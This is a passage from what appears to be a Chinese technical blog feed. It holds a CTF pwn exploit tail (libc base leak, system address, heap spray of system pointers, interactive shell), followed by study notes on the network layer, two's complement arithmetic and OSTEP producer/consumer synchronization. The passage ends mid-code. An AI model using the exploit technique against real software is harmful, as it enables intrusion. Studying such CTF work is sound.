class="number">0xf0000000</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="comment"># dbpie(0x00017AC)#malloc</span></span><br><span class="line">libcbase-=<span class="number">0x226756</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libcelf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">delete()</span><br><span class="line">slide=libcbase+<span class="number">0x24f000</span></span><br><span class="line"><span class="comment">#堆喷布置合适后门</span></span><br><span class="line">creat(<span class="number">0x20000</span>,(p32(<span class="number">0</span>)+p32(system))*(<span class="number">0x20000</span>//<span class="number">8</span>),<span class="number">1</span>)</span><br><span class="line">creat(<span class="number">0x80</span>,p32(slide)*<span class="number">0x100</span>,<span class="number">1</span>)</span><br><span class="line">action(<span class="number">17</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/09/15/2023-lmb/image-20230916221851491.png" alt="image-20230916221851491"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络:网络层</title>
      <link href="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p> 网络层协议存在于每一个主机和路由器，网络层分为了数据平面和控制平面，网络层主要有两个功能</p><ul><li>数据平面功能-&gt;转发 : 将分组从路由器的输入接口转发到合适的输出接口的本地动作<ul><li>传统方式：基于目标地址匹配 + 转发表</li><li>SDN 方式：基于多个字段匹配 + 流表</li></ul></li><li>控制平面功能-&gt;路由 : 使用路由算法来决定分组从发送主机到目标接收主机的路径<ul><li>传统的路由算法 : 路由器中的单独路由器算法元件实现</li><li>software-defined networking(SDN): 在远程的服务器中实现</li></ul></li></ul><h2 id="数据平面"><a href="#数据平面" class="headerlink" title="数据平面"></a>数据平面</h2><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>路由器协议栈具有截断的协议栈:网络层，数据链路层，物理层</p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913090338827.png" alt="image-20230913090338827"></p><p><strong>输入端口</strong></p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913091009625.png" alt="image-20230913091009625"></p><p>给定目标地址查找转发表时采用了最长前缀匹配:表中寻找最长的匹配项并向与最长前缀匹配相关联的链路接口转发分组</p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913091500271.png" alt="image-20230913091500271"></p><p><strong>交换结构</strong></p><p>将分组从输入缓冲区传输到合适的输出端口</p><ul><li><p>通过内存交换</p></li><li><p>通过总线交换</p></li><li><p>通过互联网络的交换</p></li></ul><p><strong>输出端口</strong></p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913092208493.png" alt="image-20230913092208493"></p><h3 id="网际协议-Internet-Protocol-IP"><a href="#网际协议-Internet-Protocol-IP" class="headerlink" title="网际协议(Internet Protocol,IP)"></a>网际协议(Internet Protocol,IP)</h3><p>接口是主机&#x2F;路由器和物理链路的连接处，一个IP地址与一个接口相关联，而不是与包括该接口的主机或路由器相关联 </p><h4 id="IPv4-数据报格式"><a href="#IPv4-数据报格式" class="headerlink" title="IPv4 数据报格式"></a>IPv4 数据报格式</h4><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913155055390.png" alt="image-20230913155055390"></p><p><strong>版本号</strong>：IPv4:0100 OR IPv6:0110</p><p><strong>首部长度</strong>: 以4字节为单位</p><p><strong>服务类型</strong>：用于表示数据报的优先级和服务类型</p><p><strong>总长度</strong>：首部+数据，以字节为单位</p><p><strong>标识、标志位、片偏移</strong></p><p>不同的链路层协议具有不同的MTU，有时需要对数据报分片传输(把数据切割后加上ip头)，到端系统组装</p><ul><li>标识：发送方每产生一个数据报，标识计数器就加1，数据报需要分片时，该标识符的值就被复制到所有的数据报分片的标识字段中，接收方看到相同的标识符就知道是来自同一个数据报的分片</li><li>标志位：3bit(NUL,DF,MF)<ul><li>最低一位记为MF（More Fragment)，MF&#x3D;1，则表示后面还有分片，如果MF&#x3D;0表示这已是某个数据报的最后一个分片</li><li>中间一位记为DF（Don’t Fragment），当DF&#x3D;1时表示不能对ip数据报分片，DF&#x3D;0表示允许分段</li><li>最高位暂时没用</li></ul></li><li>片偏移：16bit，分片数据在原始数据报中的偏移量，以8字节位单位</li></ul><p><strong>生存时间(Time To Live)</strong>:没经过一个路由器TTL-1，当TTL值为0时，就丢弃这个数据报</p><p><strong>协议</strong>：标识IP数据报在传输层所采用的协议类型(如TCP为6、UDP为17 ICMP为1等等),IP 数据报到达其最终目的地确定数据应该交给那个传输层协议</p><p><strong>首部校验和</strong>：和udp一样，不过每经过一个路由器，由于ttl的减一，需要重新计算该值</p><h4 id="IPv4编码"><a href="#IPv4编码" class="headerlink" title="IPv4编码"></a>IPv4编码</h4><p>32bit，一般用点分十进制表示法</p><ul><li><strong>IP地址构成</strong>：网络位+主机位 （网络位相同的IP地址，为同一网段）</li><li><strong>子网掩码</strong>： 用来确定IP地址的网络位(子网掩码与IP地址做与运算确定)</li></ul><table><thead><tr><th align="center"></th><th align="center"><strong>A类IPv4地址</strong></th><th align="center"><strong>B类IPv4地址</strong></th><th align="center"><strong>C类IPv4地址</strong></th><th align="center"><strong>D类IPv4地址</strong></th><th align="center"><strong>E类IPv4地址</strong></th></tr></thead><tbody><tr><td align="center"><strong>网络标志位</strong></td><td align="center">0</td><td align="center">10</td><td align="center">110</td><td align="center">1110</td><td align="center">11110</td></tr><tr><td align="center"><strong>IP地址范围</strong></td><td align="center">0.0.0.0~127.255.255.255</td><td align="center">128.0.0.0~191.255.255.255</td><td align="center">192.0.0.0~223.255.255.255</td><td align="center">224.0.0.0~239.255.255.255</td><td align="center">240.0.0.0~255.255.255.255</td></tr><tr><td align="center"><strong>可用IP地址范围</strong></td><td align="center">1.0.0.1~127.255.255.254</td><td align="center">128.0.0.1~191.255.255.254</td><td align="center">192.0.0.1~223.255.255.254</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>子网掩码</strong></td><td align="center">255.0.0.0</td><td align="center">255.255.0.0</td><td align="center">255.255.255.0</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>是否可以分配给主机使用</strong></td><td align="center">是</td><td align="center">是</td><td align="center">是</td><td align="center">否</td><td align="center">否</td></tr><tr><td align="center"><strong>网络数量（个）</strong></td><td align="center">126 ($2^7$-2)</td><td align="center">16384 ($2^{14}$)</td><td align="center">2097152 ($2^{21}$)</td><td align="center">—</td><td align="center">—</td></tr><tr><td align="center"><strong>每个网络中可容纳主机数（个）</strong></td><td align="center">16777214 ($2^{24}$-2)</td><td align="center">65534 ($2^{16}$-2)</td><td align="center">254 ($2^{8}$-2)</td><td align="center">—</td><td align="center">—</td></tr><tr><td align="center"><strong>适用范围</strong></td><td align="center">大量主机的大型网络</td><td align="center">中等规模主机数的网络</td><td align="center">小型局域网</td><td align="center">留给Internet体系结构委员会(IAB)使用【组播地址】</td><td align="center">保留，仅作为搜索、Internet的实验和开发用</td></tr><tr><td align="center">备注</td><td align="center">0.0.0.0为特殊地址，表示本网主机</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">255.255.255.255为特殊地址，用于定向广播</td></tr></tbody></table><p><strong>特殊ip地址</strong></p><table><thead><tr><th align="center">网络号</th><th align="center">主机号</th><th align="center">是否可以作为源地址</th><th align="center">是否可以作为目的地址</th><th align="center">备注&#x2F;描述</th></tr></thead><tbody><tr><td align="center">全为0</td><td align="center">全为0</td><td align="center">允许</td><td align="center">禁止</td><td align="center">表示本网主机</td></tr><tr><td align="center">全为0</td><td align="center">Host ID</td><td align="center">允许</td><td align="center">禁止</td><td align="center">表示特定主机</td></tr><tr><td align="center">全为1</td><td align="center">全为1</td><td align="center">禁止</td><td align="center">允许</td><td align="center">定向广播地址(只会在局域网内转发)</td></tr><tr><td align="center">127</td><td align="center">任意合法的值</td><td align="center">允许</td><td align="center">允许</td><td align="center">迂回地址，用于本地测试</td></tr><tr><td align="center">Network ID</td><td align="center">全为1</td><td align="center">禁止</td><td align="center">允许</td><td align="center">直接广播地址</td></tr></tbody></table><p><strong>内网地址</strong></p><p>A类：10.0.0.0-10.255.255.255</p><p>B类：172.16.0.0-172.31.255.255</p><p>C类：192.168.0.0-192.168.255.255</p><p>自动私有地址：169.254.0.0&#x2F;16（当计算机无法获取IP地址时自动配置）</p><h4 id="无类别域间路由选择-CIDR"><a href="#无类别域间路由选择-CIDR" class="headerlink" title="无类别域间路由选择 CIDR"></a>无类别域间路由选择 CIDR</h4><p>Classless Inter-Domain Routing</p><p>网络号部分可以在任意的位置，地址格式 : a.b.c.d&#x2F;x, 其中 x 是 地址中网络号的长度</p><h4 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议 DHCP"></a>动态主机配置协议 DHCP</h4><p>Dynamic Host Configuration Protocol</p><p>允许主机在加入网络的时候，动态地从服务器那里获得ip等内容</p><ol><li>主机以源ip为0.0.0.0，目标ip为255.255.255.255的UDP 67号端口局域网内广播<strong>DHCP发现报文</strong></li><li>DHCP服务收到一个<strong>DHCP发现报文</strong>时，使用本机ip和目标ip认为广播地址的255.255.255.255发送<strong>DHCP提供报文</strong></li><li>发送端收到<strong>DHCP提供报文后</strong>发送<strong>DHCP请求报文</strong></li><li>DHCP服务器以<strong>DHCPACK报文</strong>回应<strong>请求报文</strong></li></ol><p>DHCP 返回 :</p><ul><li>IP 地址</li><li>第一跳路由器的 IP 地址（默认网关）</li><li>DNS 服务器的域名和 IP 地址</li><li>子网掩码 ( 指示地址部分的网络号和主机号</li></ul><h4 id="网络地址转换-NAT"><a href="#网络地址转换-NAT" class="headerlink" title="网络地址转换 NAT"></a>网络地址转换 NAT</h4><p>Network Address Translation</p><p>通过本地网络只有一个有效公网IP地址，带动内网和公网通信</p><ol><li><p>对于内网外出的数据包NAT路由器，替换他的源地址和端口号为NATIP地址和新的端口号，并维护一种net转换表</p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913214526811.png" alt="image-20230913214526811"></p></li><li><p>对于返回的数据包，NAT路由器替换目标IP地址和端口号为原来的内网ip，端口</p></li></ol><h2 id="控制平面"><a href="#控制平面" class="headerlink" title="控制平面"></a>控制平面</h2><h4 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h4><p><a href="https://www.bilibili.com/video/BV1JV411t7ow/">https://www.bilibili.com/video/BV1JV411t7ow/</a> 的 46:13 左右</p><p>一个源节点对于邻居节点的代价已知，其余节点代价标记为无穷大，从源节点到达某节点的代价比当前小的话，就改写改代价</p><p>自治系统内部路由选择协议:OSPF</p><p>自治系统间路由选择协议:BGP</p><h4 id="ICMP-因特网控制报文协议"><a href="#ICMP-因特网控制报文协议" class="headerlink" title="ICMP 因特网控制报文协议"></a>ICMP 因特网控制报文协议</h4><p>Internet Control Message Protocol</p><p>ICMP 报文是作为 IP 有效载荷承载的</p><p>ping和tranceroute都是通过icmp实现的</p><p>🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2023/09/12/ComputerOrganization/"/>
      <url>/2023/09/12/ComputerOrganization/</url>
      
        <content type="html"><![CDATA[<h2 id="cpu性能"><a href="#cpu性能" class="headerlink" title="cpu性能"></a>cpu性能</h2><p>时钟周期长度(clock period): 每个时钟周期的时间长度</p><p>时钟周期数(clock cycle): 以时钟周期长度为单位</p><p>CPI(Clock cycles Per Instruction) 表示执行每条指令所需的平均时钟周期数</p><p>MIPS(Million Instructions Per Second) 每秒百万条指令</p><p>$$性能&#x3D;\frac{1}{执行时间} $$</p><p>$$时钟周期长度&#x3D;\frac{1}{时钟频率}$$</p><p>$$程序的CPU执行时间 ＝ 程序的指令数 \times每条指令的平均时钟周期数CPI \times 时钟周期长度$$</p><p>$$MIPS&#x3D;\frac{指令数}{指令时间\times10^6}&#x3D;\frac{指令数}{指令数\times CPI \times 指令周期长度\times10^6}&#x3D;\frac{1}{CPI\times指令周期长度\times10^6}&#x3D;\frac{时钟频率}{CPI\times10^6}$$</p><h2 id="补码-infty-思考"><a href="#补码-infty-思考" class="headerlink" title="补码$\infty$思考"></a>补码$\infty$思考</h2><p><strong>计算机有整数符号数为什么不用符号及值表示法而是补码</strong></p><ul><li>会浪费1bit内存，比如有+0和-0两个0</li><li>它的加、减法运算分别用加法器和减法器实现增加硬件设计复杂性 比如1字节中+1: 0000 0001 ,-1: 1000 0001,z则(+1)+(-1)如果单纯用加法器则得到1000 0010: -2，emm，如果想得到正确结果需要cpu修正</li><li>补码可以解决上述问题，符号及值表示法主要用于浮点数中</li></ul><p><strong>求补码的运算为什么会是各位取反加1？</strong></p><p>n位2进制运算中，数P的补数Q则有 $ P + Q &#x3D; 2^{n}$</p><p>求n位二进制数<strong>N</strong>的补就变为了 $2^n-N&#x3D;2^n-1-N+1$</p><p>其中$2^n-1-N&#x3D;11…1-N$ 对于N的第 i 位 n<sub>i</sub> 来说就相当于取反，$1-n_i&#x3D;\overline{n_i}$</p><p>所以就相当于对N各位取反加1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">uint8_t</span> val, res1, res2;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == <span class="built_in">scanf</span>(<span class="string">&quot;%hhd&quot;</span>, &amp;val)) &#123;</span><br><span class="line">      res1 = <span class="number">255</span> - val + <span class="number">1</span>; <span class="comment">//这里用255+1而不是256还有一个原因就是假如机器字长为8位，最大只能表示255</span></span><br><span class="line">      res2 = (~val) + <span class="number">1</span>;</span><br><span class="line">      assert(res1==res2);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;255 - x + 1 \t:%hhd\n(~val) + 1 \t:%hhd\n&quot;</span>, res1, res2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="string">&#x27;\n&#x27;</span>!=getchar())</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码，对于-128(1000 0000)的结果仍然是-128(1000 0000)，应为8bit最大只能表示127,有时可能会引发某些安全漏洞</p><p><strong>补码的逆向思考过程</strong></p><p>按照一个字节来说，我们想要-1 + 1 &#x3D; 0，即 0000 0001+？&#x3D;0</p><p>只要？满足了等于0我们就可以认为这个？就是-1，我们可以通过溢出来的到0</p><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">   0000 0001----&gt; +1</span><br><span class="line">+  1111 1111----&gt; -1</span><br><span class="line"> 1 0000 0000----&gt;  0</span><br></pre></td></tr></table></figure><p>emm，高位1溢出，得到0,这样把最高位当作符号位</p><p>所以非负数只能用最低7位表示$[0,2^7-1]$，负数则为$[-2^7,-1]$</p><p>对于n位二进制就是$[-2^{n-1},2^{n-1}-1]$</p><blockquote><p>个人认为补码提供了一种加减法统一按照无符号数加法运算的机会，根据解释方法的不同，赋予运算过程和结果不同的意义，降低硬件设计的复杂度</p></blockquote><p><strong>对于一个数求两次补码会是它本身</strong></p><p>这也和我们认知里的$-(-A)&#x3D;A$符合，可以利用这个特性快速的求解负数补码表示的数值，比如求符号位为1的补码A，他是正数B的补码，所以对A再次求补，就会得到B，A就是-B</p><p><strong>补码(有符号数)加减法溢出</strong></p><p>设A的符号位为a，B的符号为B，A+B符号为s</p><p>是否溢出判断标准$Overflow&#x3D;\overline{a}\overline{b}s+ab\overline{s}$</p><ul><li>两个正数相加，结果为负数，溢出</li><li>两个负数相加，结果为正数，溢出</li><li>整数和负数相加(即减法)不可能溢出，因为和不可能大于其中任何一个操作数</li></ul><p><strong>边界检测的简便方法</strong></p><p>将有符号数看作无符号数来处理</p><p>比如，对于大小X11的数组，索引X20的边界检查需要不满足X20&gt;&#x3D;X11 or X20&lt;0 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUBS XZR，X20，X11</span><br><span class="line">BHS IndexOutOfBounds;HS:unsigned high or same，大于或等于就跳转,即X20符号位为1 或者 符号位为0且大于时才跳转</span><br></pre></td></tr></table></figure><p>arm里cmp就是用SUBS XZR，X1，X2实现的</p><p>但是这里BHS需要carry位&#x3D;&#x3D;1跳，即carry&#x3D;=1代表X20&gt;&#x3D;X11，<strong>和X86正好是相反的</strong></p><p>猜测原因是因为SUBS XZR，X1，X2 &#x3D; X1 + not(X2) + 1 用加法器来实现，也符合大于等于的结果(等于就是正好溢出时的情况)</p><h2 id="浮点-infty-思考"><a href="#浮点-infty-思考" class="headerlink" title="浮点$\infty$思考"></a>浮点$\infty$思考</h2><p>之前有讨论过iee754两个比较有意思的事情</p><p>浮点数表示及传参: <a href="https://grxer.gitee.io/2023/04/17/An-interview-question-from-baidu/">https://grxer.gitee.io/2023/04/17/An-interview-question-from-baidu/</a></p><p>浮点数运算误差及减小: <a href="https://grxer.gitee.io/2023/04/23/floating-point-calculation-and-kahan/">https://grxer.gitee.io/2023/04/23/floating-point-calculation-and-kahan/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:30&amp;&amp;31 条件变量&amp;&amp;信号量</title>
      <link href="/2023/09/10/OSTEP-30-31-Condition-Semaphores/"/>
      <url>/2023/09/10/OSTEP-30-31-Condition-Semaphores/</url>
      
        <content type="html"><![CDATA[<h2 id="条件变量实现生产者-x2F-消费者"><a href="#条件变量实现生产者-x2F-消费者" class="headerlink" title="条件变量实现生产者&#x2F;消费者"></a>条件变量实现生产者&#x2F;消费者</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> buffer[MAX];</span><br><span class="line"><span class="type">int</span> fill = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> use = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">  buffer[fill] = value;</span><br><span class="line">  fill = (fill + <span class="number">1</span>) % MAX;</span><br><span class="line">  count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> tmp = buffer[use];</span><br><span class="line">  use = (use + <span class="number">1</span>) % MAX;</span><br><span class="line">  count--;</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">cond_t</span> empty, fill;</span><br><span class="line"><span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;mutex);          <span class="comment">// p1</span></span><br><span class="line">    <span class="keyword">while</span> (count == MAX)                 <span class="comment">// p2</span></span><br><span class="line">      Pthread_cond_wait(&amp;empty, &amp;mutex); <span class="comment">// p3</span></span><br><span class="line">    put(i);                              <span class="comment">// p4</span></span><br><span class="line">    Pthread_cond_signal(&amp;fill);          <span class="comment">// p5</span></span><br><span class="line">    Pthread_mutex_unlock(&amp;mutex);        <span class="comment">// p6</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;mutex);         <span class="comment">// c1</span></span><br><span class="line">    <span class="keyword">while</span> (count == <span class="number">0</span>)                  <span class="comment">// c2</span></span><br><span class="line">      Pthread_cond_wait(&amp;fill, &amp;mutex); <span class="comment">// c3</span></span><br><span class="line">    <span class="type">int</span> tmp = get();                    <span class="comment">// c4</span></span><br><span class="line">    Pthread_cond_signal(&amp;empty);        <span class="comment">// c5</span></span><br><span class="line">    Pthread_mutex_unlock(&amp;mutex);       <span class="comment">// c6</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, tmp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件变量使用技巧</p><ul><li>Pthread_cond_signal发信号时总是持有锁</li><li>对条件变量使用 while（不是 if）</li></ul><blockquote><p><strong>例子生产者&#x2F;消费者p2和c2为什么用while？</strong></p><p>如果用if，考虑一个生产者Tp，两个消费者Tc1和Tc2，Tc1先执行此时buffer里没有数据，执行到c3休眠，Tp随后执行，放入数据后，执行到p5唤醒Tc1,Tc1进入就绪态还未运行时，Tc2执行拿走了buffer里所有数据，随后Tc1运行，如果时if直接就好执行c4去get空的buffer里的数据，触发错误，如果时while还会检测(count&#x3D;&#x3D;0)一些缓冲区是否有数据，从而避免错误</p><p><strong>为什么用了两个条件变量empty, fill？</strong></p><p>是为了实现消费者不应该唤醒消费者，而应该只唤醒生产者，同样生产者只能唤醒消费者</p><p>如果共用一个条件变量，即消费者可以唤醒消费者，试想缓冲区没有数据Tc1，Tc2休眠，随后Tp放入一个数据后睡眠，Tc1唤醒拿走数据，如果此时唤醒Tc2，Tc2发现没有数据继续睡眠，此时三个都在睡眠，形成死锁</p></blockquote><p>一个比较形象的例子，下面的代码打印左括号代表生产，右括号代表取走</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread-sync.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, count = <span class="number">0</span>;</span><br><span class="line"><span class="type">mutex_t</span> lk = MUTEX_INIT();</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tproduce</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == n) &#123;<span class="comment">//缓冲区生产满了</span></span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Tconsume</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;<span class="comment">//缓冲区为空</span></span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  assert(argc == <span class="number">2</span>);</span><br><span class="line">  n = atoi(argv[<span class="number">1</span>]);<span class="comment">//缓冲区大小</span></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    create(Tproduce);</span><br><span class="line">    create(Tconsume);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>压力测试脚本 pc-check.py </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">limit = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">count, n = <span class="number">0</span>, <span class="number">100000</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> sys.stdin.read(n):</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&#x27;(&#x27;</span>: count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&#x27;)&#x27;</span>: count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt;= count &lt;= limit<span class="comment">#消费者不会多取</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n&#125;</span> Ok.&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/N/p6&gt; ./a.out 10 | python pc-check.py 10</span><br><span class="line">100000 Ok.</span><br><span class="line">100000 Ok.</span><br><span class="line">100000 Ok.</span><br><span class="line">100000 Ok.</span><br></pre></td></tr></table></figure><h2 id="信号量实现生产者-x2F-消费者"><a href="#信号量实现生产者-x2F-消费者" class="headerlink" title="信号量实现生产者&#x2F;消费者"></a>信号量实现生产者&#x2F;消费者</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sem_wait</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;</span><br><span class="line">信号量sem减一，如果结果大于<span class="number">0</span>直接返回，否则阻塞到sem能够减一即等待直到有其它线程增加了这个值使它不再是<span class="number">0</span>为止</span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_post</span><span class="params">(<span class="type">sem_t</span> *sem)</span>; </span><br><span class="line">信号量sem加一，唤醒一个该信号量阻塞的线程</span><br></pre></td></tr></table></figure><p><strong>信号量实现锁</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> m;</span><br><span class="line">sem_init(&amp;m, <span class="number">0</span>, <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">sem_wait(&amp;m);</span><br><span class="line"><span class="comment">// critical section here</span></span><br><span class="line">sem_post(&amp;m);</span><br></pre></td></tr></table></figure><p><strong>信号量实现条件变量</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> m;</span><br><span class="line">sem_init(&amp;m, <span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">sem_wait(&amp;s);<span class="comment">//阻塞该线程等待某个线程程执行sem_post(&amp;s);唤醒才能继续往下执行</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p><strong>生产者&#x2F;消费者</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> empty;</span><br><span class="line"><span class="type">sem_t</span> full;</span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    sem_wait(&amp;empty); <span class="comment">// line p1</span></span><br><span class="line">    sem_wait(&amp;mutex); <span class="comment">// line p1.5 (MOVED MUTEX HERE...)</span></span><br><span class="line">    put(i);           <span class="comment">// line p2</span></span><br><span class="line">    sem_post(&amp;mutex); <span class="comment">// line p2.5 (... 